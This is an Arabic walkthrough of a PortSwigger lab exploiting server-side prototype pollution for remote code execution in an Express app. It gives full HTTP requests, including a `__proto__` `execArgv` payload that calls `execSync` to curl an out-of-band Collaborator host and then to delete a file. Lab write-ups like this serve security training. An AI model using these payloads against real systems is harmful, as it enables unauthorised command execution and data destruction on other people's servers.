# [Remote code execution via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution)

## **`الهدف`**
قم بالعثور على مصدر يمكنك استخدامه لإضافة خصائص عشوائية إلى `Object.prototype`، ثم قم بتحديد أداة تسمح لك بحقن أوامر النظام، ثم قم بتنفيذ أمر عن بُعد لحذف الملف `/home/carlos/morale.txt`.
## **`خطوات الحل`**
**`ملاحظة هامة:`** يمكن حل هذا اللاب عن طريق`Status code override` أو `JSON spaces override` أو `Charset override` ولكني سأستعمل الطريقة الثانية هنا.

سنقوم بتسجيل الدخول إلى حساب `wiener:peter` وبعد ذلك سنقوم بتغيير أى جزء من الـ `Billing and Delivery Address` ونضغط `Submit` وبعد ذلك سنقوم بالعثور على الطلب الخاص بهذا الجزء في `HTTP history` ونقوم بتحويله إلى `Repeater`
```http
POST /my-account/change-address HTTP/2
Host: 0a2300f50360754f833f14af00630057.web-security-academy.net
Cookie: session=uUqhapbVdr1hQXbXwbnwlOmBrQqBhcaM

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"uUqhapbVdr1hQXbXwbnwlOmBrQqBhcaM"}
```

وعند فحص الاستجابة سنجد أن السيرفر يرد بـ `JSON` يمثل المستخدم الخاص بنا.
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"bf-hUt5RNzXcUPY/p47gJQ+q/fN5zc"
Date: Tue, 03 Nov 2026 13:28:38 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 191

{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":true}
```

بعد ذلك سنقوم بتعديل الطلب عن طريق وضع خاصية جديدة في `JSON` باسم `__proto__`
```http
POST /my-account/change-address HTTP/2
Host: 0a2300f50360754f833f14af00630057.web-security-academy.net
Cookie: session=uUqhapbVdr1hQXbXwbnwlOmBrQqBhcaM

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"uUqhapbVdr1hQXbXwbnwlOmBrQqBhcaM",
"__proto__": {
    "json spaces":10
}
}
```
وعند فحص الاستجابة من داخل تاب `Raw` سنلاحظ وجود تأثير على الـ `JSON indentation`
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"149-ZVBU6GrZ8fT0+Y7Y+0TIzGg8vzQ"
Date: Tue, 03 Nov 2026 13:29:00 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 329

{
          "username": "wiener",
          "firstname": "Peter",
          "lastname": "Wiener",
          "address_line_1": "TEST",
          "address_line_2": "One Wiener Way",
          "city": "Wienerville",
          "postcode": "BU1 1RP",
          "country": "UK",
          "isAdmin": true,
          "json spaces": 10
}
```

بعد ذلك سنقوم بالتوجه إلى المتصفح والدخول إلى لوحة التحكم ونقوم بالضغط على `Run maintenance jobs` وسنلاحظ في الـ `HTTP history` أنه يحدث طلب يوضح أن هذا الزر يُشغل مهامًا تعمل فى الخلفية لتنظيم قاعدة البيانات ونظام الملفات، وهذا مثال نموذجي على نوع الوظائف التي قد تُنشئ عمليات فرعية في `Node`
```http
POST /admin/jobs HTTP/2
Host: 0a2300f50360754f833f14af00630057.web-security-academy.net
Cookie: session=uUqhapbVdr1hQXbXwbnwlOmBrQqBhcaM

{"csrf":"3pxztx6r3rVnGPP2R5NS2pxLu234wjt4","sessionId":"uUqhapbVdr1hQXbXwbnwlOmBrQqBhcaM","tasks":["db-cleanup","fs-cleanup"]}
```

والاستجابة تكون
```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"1e3-FCLLKbEoTy1W0ntJnbriVtYsbfg"
Date: Tue, 03 Nov 2026 13:30:17 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 483

{
          "results": [
                    {
                              "name": "db-cleanup",
                              "success": true,
                              "message": "Child process executed successfully"
                    },
                    {
                              "name": "fs-cleanup",
                              "success": true,
                              "message": "Child process executed successfully"
                    }
          ]
}
```

بعد ذلك سنقوم بتعديل الطلب لمحاولة تلويث النموذج الأولي بخاصية `execArgv` خبيثة والتي تُضيف الوسيط `--eval` إلى العملية الفرعية المنُشأة، وسنستعمل هذا لاستدعاء مصب `execSync()` مع تمرير أمر يُحدث تفاعل مع سيرفر `Burp Collaborator` العام.
```http
POST /my-account/change-address HTTP/2
Host: 0ad900d603bdc63d8164f2df006200ab.web-security-academy.net
Cookie: session=hdbTIWofbzJMwGIO71OxIX53yvtLUEu5

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"hdbTIWofbzJMwGIO71OxIX53yvtLUEu5","__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}}
```

بعد ذلك سنقوم بالتوجه إلى المتصفح والدخول إلى لوحة التحكم ونقوم بالضغط على `Run maintenance jobs` وسنلاحظ أن كلاهما قد فشل هذه المرة.

وبعد ذلك سنتوجه إلى تاب `Collaborator` في `Burp` وسنضغط `poll for interactions` وسنلاحظ استلام عدة تفاعلات `DNS` مما يؤكد الـ `RCE`.

بعد ذلك سنقوم بتعديل الطلب لنجعله يقوم بحذف الملف المطلوب
```http
POST /my-account/change-address HTTP/2
Host: 0ad900d603bdc63d8164f2df006200ab.web-security-academy.net
Cookie: session=hdbTIWofbzJMwGIO71OxIX53yvtLUEu5

{"address_line_1":"TEST","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":"hdbTIWofbzJMwGIO71OxIX53yvtLUEu5","__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}}
```

بعد ذلك سنقوم بالتوجه إلى المتصفح والدخول إلى لوحة التحكم ونقوم بالضغط على `Run maintenance jobs` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Privilege escalation via server-side prototype pollution](./Privilege-escalation-via-server-side-prototype-pollution.md)
